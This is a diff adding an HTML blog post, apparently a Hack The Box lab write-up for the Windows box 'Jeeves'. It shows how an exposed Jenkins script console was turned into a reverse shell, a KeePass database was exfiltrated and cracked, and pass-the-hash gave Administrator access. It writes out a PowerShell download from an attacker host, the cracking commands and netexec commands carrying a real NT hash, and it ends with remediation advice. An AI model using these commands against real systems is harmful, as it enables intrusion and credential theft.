@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+  <title>┌──(1kb2㉿onekbtwo)-[~/blog/jeeves]</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="alternate" type="application/rss+xml" title="1kb2" href="../feed.xml">
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="../favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../apple-touch-icon.png">
+  <meta name="theme-color" content="#000000">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="HTB CPTS Track: Jeeves (medium)">
+  <meta property="og:description" content="Black-box Windows box: unauthenticated Jenkins gives RCE via the Groovy console, a cracked KeePass database leaks the Administrator NT hash, and root.txt hides in an NTFS alternate data stream.">
+  <meta property="og:url" content="https://1kb2.xyz/blog/jeeves.html">
+  <meta property="og:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="HTB CPTS Track: Jeeves (medium)">
+  <meta name="twitter:description" content="Black-box Windows box: unauthenticated Jenkins gives RCE via the Groovy console, a cracked KeePass database leaks the Administrator NT hash, and root.txt hides in an NTFS alternate data stream.">
+  <meta name="twitter:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <script>document.documentElement.className = "js";</script>
+  <script src="../js/graf.js" defer></script>
+  <script src="../js/post.js" defer></script>
+</head>
+<body data-graf="perch">
+  <nav class="nav">
+    <a href="../index.html">home</a>
+    <a href="../timeline.html">timeline</a>
+    <a href="../blog/index.html">blog</a>
+    <a href="../feed.xml">rss</a>
+  </nav>
+
+  <main class="markdown-body">
+    <h1>HTB CPTS Track: Jeeves (medium)</h1>
+    <p class="post-meta">2026-09-26 &middot; <a class="post-cat" href="index.html#cat-writeups">writeups</a></p>
+    <p class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a><a class="tag" href="tag/jenkins.html" data-tag="jenkins">#jenkins</a><a class="tag" href="tag/groovy-script.html" data-tag="groovy-script">#groovy-script</a><a class="tag" href="tag/keepass.html" data-tag="keepass">#keepass</a><a class="tag" href="tag/password-cracking.html" data-tag="password-cracking">#password-cracking</a><a class="tag" href="tag/pass-the-hash.html" data-tag="pass-the-hash">#pass-the-hash</a><a class="tag" href="tag/alternate-data-streams.html" data-tag="alternate-data-streams">#alternate-data-streams</a></p>
+    <p class="post-abstract">Black-box Windows box: unauthenticated Jenkins gives RCE via the Groovy console, a cracked KeePass database leaks the Administrator NT hash, and root.txt hides in an NTFS alternate data stream.</p>
+    <details class="toc-box" open>
+      <summary>contents</summary>
+<div class="toc">
+<ul>
+<li><a href="#enumeration">Enumeration</a><ul>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#port-80">Port 80</a></li>
+<li><a href="#port-50000">Port 50000</a></li>
+</ul>
+</li>
+<li><a href="#initial-foothold-jenkins-groovy-script-console">Initial Foothold: Jenkins Groovy Script Console</a></li>
+<li><a href="#privilege-escalation-keepass-to-administrator">Privilege Escalation: KeePass to Administrator</a><ul>
+<li><a href="#exfiltrate-the-database">Exfiltrate the database</a></li>
+<li><a href="#crack-the-master-password">Crack the master password</a></li>
+<li><a href="#the-administrator-hash">The Administrator hash</a></li>
+</ul>
+</li>
+<li><a href="#root-flag-the-hidden-stream">Root Flag: The Hidden Stream</a></li>
+<li><a href="#remediation">Remediation</a></li>
+</ul>
+</div>
+    </details>
+<p><img alt="" src="../images/Jeeves1.png" /></p>
+<p>Jeeves is a standalone Windows box (no Active Directory, just <code>WORKGROUP</code>), and you start black-box with no credentials. The path is a clean chain of four moves that each teach something reusable:</p>
+<ol>
+<li>An unauthenticated <strong>Jenkins</strong> instance on a non-standard port, reachable only after directory fuzzing, hands you RCE through the <strong>Groovy Script Console</strong>.</li>
+<li>A <strong>KeePass</strong> database (<code>CEH.kdbx</code>) sitting in the foothold user's Documents, master password cracked offline with john.</li>
+<li>A KeePass entry that leaks the local <strong>Administrator's NT hash</strong>, used for a <strong>pass-the-hash</strong> login.</li>
+<li><code>root.txt</code> tucked into an <strong>NTFS alternate data stream</strong> so it doesn't show up in a normal <code>dir</code>.</li>
+</ol>
+<blockquote>
+<p>No assumed-breach creds here. Everything starts from an Nmap scan.</p>
+</blockquote>
+<hr />
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="link to this section">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="link to this section">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.66.183<span class="w"> </span>-T5
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 10.0
+|_http-title: Ask Jeeves
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-title: Error 404 Not Found
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode:
+|   account_used: guest
+|_  message_signing: disabled (dangerous, but default)
+</code></pre></div>
+
+<p>Small attack surface, and it reads clearly: IIS on 80, SMB on 445 (<code>WORKGROUP</code>, so this is a standalone host, not a domain), and the odd one out is <strong>Jetty on 50000</strong>. Jetty is a Java servlet container, which usually means a Java app is bolted onto it. The hostname is <code>JEEVES</code>. SMB message signing is disabled but with a guest-level account there's nothing to relay to here, so I moved on.</p>
+<h3 id="port-80">Port 80<a class="headerlink" href="#port-80" title="link to this section">&para;</a></h3>
+<p><img alt="" src="../images/jeeves2.png" /></p>
+<p>A static "Ask Jeeves" search page. I tried subdomain and directory fuzzing against it, no useful hits. Dead end for now.</p>
+<h3 id="port-50000">Port 50000<a class="headerlink" href="#port-50000" title="link to this section">&para;</a></h3>
+<p><img alt="" src="../images/jeeves3.png" /></p>
+<p>Hitting the root gives a bare <code>404</code>, which fits the Jetty fingerprint, the container is up but nothing is mapped at <code>/</code>. When the root 404s but the server is clearly alive, the app is usually mounted under a path, so I fuzzed for one:</p>
+<div class="codehilite"><pre><span></span><code>ffuf<span class="w"> </span>-w<span class="w"> </span>/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ<span class="w"> </span>-u<span class="w"> </span>http://10.129.66.183:50000/FUZZ<span class="w"> </span>-ic
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 26ms]
+</code></pre></div>
+
+<p>One hit: <code>/askjeeves</code>, a 302 redirect. Following it lands on <strong>Jenkins</strong>:</p>
+<p><img alt="" src="../images/jeeves4.png" /></p>
+<p>The footer gives up the exact Jenkins version. I ran the version through a clanker to hunt for a matching CVE, but nothing clean came back for this build, so instead of chasing an exploit I just poked at the UI, and Jenkins itself hands you code execution if you can reach it unauthenticated.</p>
+<hr />
+<h2 id="initial-foothold-jenkins-groovy-script-console">Initial Foothold: Jenkins Groovy Script Console<a class="headerlink" href="#initial-foothold-jenkins-groovy-script-console" title="link to this section">&para;</a></h2>
+<p>The console is reachable without logging in, so no exploit needed, just the built-in feature:</p>
+<ol>
+<li>From the dashboard I clicked <strong>Build Executor Status</strong>:</li>
+</ol>
+<p><img alt="" src="../images/jeeves5.png" /></p>
+<ol start="2">
+<li>That lists the build nodes, including one named <code>master</code>:</li>
+</ol>
+<p><img alt="" src="../images/jeeves7.png" /></p>
+<ol start="3">
+<li>On the <code>master</code> node I opened <strong>Script Console</strong>:</li>
+</ol>
+<p><img alt="" src="../images/jeeves8.png" /></p>
+<ol start="4">
+<li>The console runs <strong><a href="https://en.wikipedia.org/wiki/Apache_Groovy">Groovy</a></strong>, and a quick search turned up a <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">Pure Groovy/Java reverse shell</a>:</li>
+</ol>
+<p><img alt="" src="../images/jeeves9.png" /></p>
+<blockquote>
+<p><strong>Why this works:</strong> the Jenkins Script Console executes arbitrary Groovy (which is just Java) directly on the controller, with no sandbox, running as the Jenkins service account. Anyone who can load <code>/script</code> without authentication effectively has a shell on the box. It's not a "vulnerability" so much as an admin feature exposed to the wrong people, which is exactly why leaving Jenkins unauthenticated is fatal.</p>
+</blockquote>
+<p>Running the Groovy reverse shell against my listener gave a shell as <code>jeeves\kohsuke</code>:</p>
+<p><img alt="" src="../images/jeeves10.png" /></p>
+<p>And then I read the flag from <code>kohsuke</code>'s Desktop.</p>
+<p><strong>user.txt captured.</strong></p>
+<hr />
+<h2 id="privilege-escalation-keepass-to-administrator">Privilege Escalation: KeePass to Administrator<a class="headerlink" href="#privilege-escalation-keepass-to-administrator" title="link to this section">&para;</a></h2>
+<p>I pulled winPEAS over to look for the usual escalation paths:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">"(New-Object Net.WebClient).DownloadFile('http://10.10.15.141:8000/winPEASx64.exe','C:\Users\kohsuke\winPEASx64.exe')"</span>
+</code></pre></div>
+
+<p>winPEAS didn't hand me a privesc primitive, but manually exploring <code>kohsuke</code>'s home directory turned up something more interesting in <code>Documents</code>, a KeePass database:</p>
+<div class="codehilite"><pre><span></span><code>C:\Users\kohsuke\Documents&gt;dir
+09/18/2017  01:43 PM             2,846 CEH.kdbx
+</code></pre></div>
+
+<p>A <code>.kdbx</code> in a user's Documents is worth stopping for, a password manager on a box you already have a foothold on almost always stores something that escalates.</p>
+<h3 id="exfiltrate-the-database">Exfiltrate the database<a class="headerlink" href="#exfiltrate-the-database" title="link to this section">&para;</a></h3>
+<p>The file is tiny, so I base64-encoded it and pasted it back locally rather than standing up a transfer. Because base64 over a shell can silently mangle bytes, I hash the file on the target first and compare after decoding to confirm integrity:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">"Get-FileHash "</span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">kohsuke</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">CEH</span><span class="p">.</span><span class="n">kdbx</span><span class="s2">" -Algorithm MD5 | select Hash"</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">"[Convert]::ToBase64String((Get-Content -path CEH.kdbx -Encoding byte))"</span>
+
+<span class="n">A9mimmf7S7UBAAMAAhAAMcHy5r9xQ1C</span><span class="p">+</span><span class="n">WAUhavxa</span><span class="p">/</span><span class="n">wMEAAEAAAAEIAAa9AXMAPl53bm7OHxFlPzqL9A</span>
+<span class="p">...</span>  <span class="p">(</span><span class="n">full</span> <span class="n">base64</span> <span class="n">blob</span> <span class="n">trimmed</span><span class="p">)</span>  <span class="p">...</span>
+<span class="n">zvcw</span><span class="p">=</span>
+</code></pre></div>
+
+<p>Decode it back to a <code>.kdbx</code> locally:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">"A9mimmf7S7UBAAMAAhAA...zvcw="</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>CEH.kdbx
+</code></pre></div>
+
+<h3 id="crack-the-master-password">Crack the master password<a class="headerlink" href="#crack-the-master-password" title="link to this section">&para;</a></h3>
+<p>Extract the KeePass master-key hash and crack it offline:</p>
+<div class="codehilite"><pre><span></span><code>keepass2john<span class="w"> </span>CEH.kdbx
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea...
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt<span class="w"> </span>keepass
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 6000 for all loaded hashes
+moonshine1       (CEH)
+1g 0:00:00:43 DONE (2026-09-25 18:37)
+</code></pre></div>
+
+<p>Master password: <strong><code>moonshine1</code></strong>.</p>
+<h3 id="the-administrator-hash">The Administrator hash<a class="headerlink" href="#the-administrator-hash" title="link to this section">&para;</a></h3>
+<p>Open the database with the cracked master password:</p>
+<p><img alt="" src="../images/jeeves11.png" /></p>
+<p>The <code>Backup stuff</code> entry doesn't hold a password, it holds what is clearly an NTLM hash. I can use that to perform Pass-The-Hash authentication.</p>
+<blockquote>
+<p><strong>Why pass-the-hash works:</strong> NTLM authentication never sends the plaintext password. The client proves it knows the NT hash by using it directly in the challenge-response. So a bare NT hash is a credential in its own right, if you have it, you authenticate <em>as</em> that account without ever knowing (or cracking) the password behind it.</p>
+</blockquote>
+<p>Pass the hash as <code>Administrator</code> and confirm it lands:</p>
+<div class="codehilite"><pre><span></span><code>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.66.183<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Administrator'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'e0fb1fb85756c24235ff238cbe81fe00'</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">'dir C:\Users\Administrator\Desktop'</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>SMB   10.129.66.183   445   JEEVES   [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
+SMB   10.129.66.183   445   JEEVES   [+] Executed command via atexec
+SMB   10.129.66.183   445   JEEVES   12/24/2017  03:51 AM    36 hm.txt
+SMB   10.129.66.183   445   JEEVES   11/08/2017  10:05 AM   797 Windows 10 Update Assistant.lnk
+</code></pre></div>
+
+<p><code>Pwn3d!</code> confirms full Administrator access. (Note the <code>WMIEXEC</code> DCOM path failed, so netexec fell back to <code>atexec</code>, which is a scheduled-task-based exec method, no code change needed on my end.)</p>
+<hr />
+<h2 id="root-flag-the-hidden-stream">Root Flag: The Hidden Stream<a class="headerlink" href="#root-flag-the-hidden-stream" title="link to this section">&para;</a></h2>
+<p><code>Administrator</code>'s Desktop has <code>hm.txt</code> instead of the expected <code>root.txt</code>. Reading it is a taunt:</p>
+<div class="codehilite"><pre><span></span><code>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.66.183<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Administrator'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'e0fb1fb85756c24235ff238cbe81fe00'</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">'type C:\Users\Administrator\Desktop\hm.txt'</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>SMB   10.129.66.183   445   JEEVES   The flag is elsewhere.  Look deeper.
+</code></pre></div>
+
+<p>I dropped an interactive PowerShell reverse shell (base64-encoded <code>powershell -e ...</code> run over the same PTH session) to poke around properly, then spent an embarrassing amount of time throwing every <code>dir</code> variant I could think of at the Desktop, <code>dir /a</code>, <code>dir -force</code>, <code>dir /r</code>, mixing cmd and PowerShell syntax, none of which showed anything new. The trick, which I got a nudge toward from flarycen (<a href="http://flarycen.net">http://flarycen.net</a>), is that "look deeper" means an <strong>alternate data stream</strong> hanging off <code>hm.txt</code>.</p>
+<blockquote>
+<p><strong>Why this hides the flag:</strong> NTFS lets any file carry extra named streams besides its main <code>:$DATA</code> content. A normal <code>dir</code> (and <code>type</code>, and Explorer) only ever shows the default stream, so data parked in a named stream is invisible to casual enumeration. You have to explicitly enumerate streams (<code>Get-Item -Stream *</code>) or read one by name (<code>file:stream</code>).</p>
+</blockquote>
+<p>Enumerate the streams on <code>hm.txt</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">Get-Item</span> <span class="p">.\</span><span class="n">hm</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Stream</span> <span class="p">*</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>   FileName: C:\Users\Administrator\Desktop\hm.txt
+
+Stream                   Length
+------                   ------
+:$DATA                       36
+root.txt                     34
+</code></pre></div>
+
+<p>There it is, a <code>root.txt</code> stream riding on <code>hm.txt</code>. Read it by name:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">Get-Content</span> <span class="p">.\</span><span class="n">hm</span><span class="p">.</span><span class="n">txt</span><span class="p">:</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="p">&lt;</span><span class="n">FLAG</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p><strong>root.txt captured. Box owned.</strong></p>
+<hr />
+<h2 id="remediation">Remediation<a class="headerlink" href="#remediation" title="link to this section">&para;</a></h2>
+<ul>
+<li><strong>Lock down Jenkins.</strong> Require authentication (enable security realm + authorization), never expose the Script Console to anonymous users, and don't publish Jenkins on an internet- or broadly-reachable port. Unauthenticated <code>/script</code> is remote code execution by design.</li>
+<li><strong>Don't store credentials in password databases on the machines they protect,</strong> and don't reuse a weak master password (<code>moonshine1</code> fell to rockyou in 43 seconds). If a KeePass DB must live on a host, its master key should be long and not in any wordlist.</li>
+<li><strong>Rotate the leaked Administrator hash</strong> and stop stashing NT hashes in note fields (that was a first for me).</li>
+</ul>
+<hr />
+<p>References used:</p>
+<ul>
+<li><a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">Pure Groovy/Java reverse shell (frohoff gist)</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Apache_Groovy">Apache Groovy</a></li>
+</ul>
+  </main>
+  <nav class="related" aria-label="Related posts">
+    <h2 class="related-h">related</h2>
+    <ul class="posts">
+      <li class="post"><a class="post-title" href="fluffy.html">HTB CPTS Track: Fluffy (easy)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+    </ul>
+  </nav>
+
+  <footer class="footer">
+    <a href="../index.html">back to top</a>
+  </footer>
+</body>
+</html>
